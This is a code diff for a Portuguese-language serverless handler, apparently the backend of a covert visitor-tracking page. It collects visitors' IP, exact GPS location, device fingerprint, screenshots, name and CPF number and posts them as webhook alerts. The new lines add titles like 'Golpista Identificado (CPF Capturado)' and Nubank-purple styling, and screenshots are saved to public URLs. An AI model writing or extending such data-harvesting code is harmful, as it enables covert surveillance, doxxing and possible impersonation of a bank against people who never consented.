@@ -104,12 +104,10 @@ export default async function handler(req, res) {
   const meta = d.meta || {};
 
   // Validação básica para evitar payloads arbitrários.
-  // Nota: Agora validamos os campos novos
   if (typeof d.ip !== 'string' || !d.ip || d.ip.length > 64) {
     return res.status(400).json({ error: 'IP inválido' });
   }
   
-  // Validação opcional de CPF (se presente)
   if (d.cpf && typeof d.cpf !== 'string') {
     return res.status(400).json({ error: 'CPF inválido' });
   }
@@ -126,21 +124,15 @@ export default async function handler(req, res) {
   let alerta = '';
   let distanciaKm = null;
 
-  // 1. Verifica se é CDN
   const isCdn = ehCdn(d.asn);
-
-  // 2. Verifica se temos um centro de fuso horário conhecido
   const fusoLocal = meta.fuso;
   const centroFuso = FUSO_CENTROS[fusoLocal];
 
-  // 3. Calcula distância entre IP e Centro do Fuso
   if (latFinal && lonFinal && centroFuso) {
     distanciaKm = haversine(latFinal, lonFinal, centroFuso.lat, centroFuso.lon);
   }
 
-  // 4. Regras de Correção
   if (isCdn) {
-    // Se for CDN, o IP é do datacenter. Não confie nas coordenadas do IP.
     if (centroFuso) {
       latFinal = centroFuso.lat;
       lonFinal = centroFuso.lon;
@@ -153,8 +145,6 @@ export default async function handler(req, res) {
       alerta = 'IP pertence a CDN. Precisão limitada à região do datacenter.';
     }
   } else if (distanciaKm !== null && distanciaKm > 50) {
-    // Se não for CDN, mas a distância entre o IP e o centro do fuso for > 50km,
-    // há alta probabilidade de o IP estar em uma cidade vizinha.
     latFinal = centroFuso.lat;
     lonFinal = centroFuso.lon;
     cidadeFinal = centroFuso.nome;
@@ -165,20 +155,35 @@ export default async function handler(req, res) {
     precisaoInfo = 'IP Direto (Alta Confiança)';
   }
 
-  // Verifica se usou GPS real
   if (d.usadoGps) {
     precisaoInfo = `GPS Exato (±${Math.round(d.accuracy || 0)}m)`;
   }
+  
+  // ============================================
+  // TÍTULO E COR DINÂMICOS
+  // ============================================
+  let tituloEmbed = '👀 Novo Visitante Detectado';
+  let corEmbed = 0x820AD1; // Roxo Nubank
+  
+  if (d.tipoEvento === 'geo_update') {
+    tituloEmbed = '📍 Localização Exata Obtida';
+    corEmbed = 0x2ECC71; // Verde
+  } else if (d.tipoEvento === 'final') {
+    tituloEmbed = '🚨 Golpista Identificado (CPF Capturado)';
+    corEmbed = 0xE74C3C; // Vermelho
+  }
 
-  // 5. Montagem do Embed
+  // ============================================
+  // MONTAGEM DO EMBED
+  // ============================================
   const embed = {
-    title: '🌍 Diagnóstico Refinado',
-    color: 0x6b21a8,
-    description: `Dados refinados usando metadados locais e lógica de fuso horário.`,
+    title: tituloEmbed,       // CORRIGIDO: Usa título dinâmico
+    color: corEmbed,          // CORRIGIDO: Usa cor dinâmica
+    description: 'Dados refinados usando metadados locais e lógica de fuso horário.',
     fields: [
-      // Dados Pessoais
-      { name: 'CPF', value: campo(d.cpf), inline: true },
-      { name: 'Nome', value: campo(d.nome), inline: true },
+      // Dados Pessoais (Apenas se presente)
+      ...(d.cpf ? [{ name: 'CPF', value: campo(d.cpf), inline: true }] : []),
+      ...(d.nome ? [{ name: 'Nome', value: campo(d.nome), inline: true }] : []),
       
       // Localização
       { name: 'IP público', value: campo(d.ip), inline: true },
@@ -198,7 +203,7 @@ export default async function handler(req, res) {
       { name: 'GPU', value: campo(meta.gpu?.renderer, 150), inline: false },
       { name: 'Navegador', value: campo(meta.userAgent, 200), inline: false },
       { name: 'Idioma', value: campo(meta.idiomas), inline: true },
-      { name: 'Resolução', value: campo(meta.resolucao || `${meta.larguraTela}x${meta.alturaTela}`), inline: true }
+      { name: 'Resolução', value: campo(`${meta.larguraTela}x${meta.alturaTela}`), inline: true }
     ],
     timestamp: /^\d{4}-\d{2}-\d{2}T/.test(d.horario || '')
       ? d.horario
@@ -209,8 +214,10 @@ export default async function handler(req, res) {
     embed.footer = { text: `⚠️ ${alerta}` };
   }
 
-  // Processar Screenshot (Opcional)
-  if (d.screenshot && d.screenshot.startsWith('data:image/png;base64,')) {
+  // ============================================
+  // PROCESSAR SCREENSHOT (APENAS NO EVENTO FINAL)
+  // ============================================
+  if (d.tipoEvento === 'final' && d.screenshot && d.screenshot.startsWith('data:image/png;base64,')) {
     try {
       const fs = require('fs');
       const path = require('path');
@@ -228,13 +235,10 @@ export default async function handler(req, res) {
       
       fs.writeFileSync(filePath, buffer);
       
-      // Gera URL pública
       const vercelUrl = process.env.VERCEL_URL || `https://${req.headers.host}`;
       embed.image = { url: `${vercelUrl}/screenshots/${filename}` };
-      embed.fields.push({ name: 'Screenshot', value: 'Imagem capturada abaixo.', inline: false });
     } catch (e) {
       console.error('Erro ao salvar screenshot:', e);
-      // Não quebra o envio se o screenshot falhar
     }
   }
 
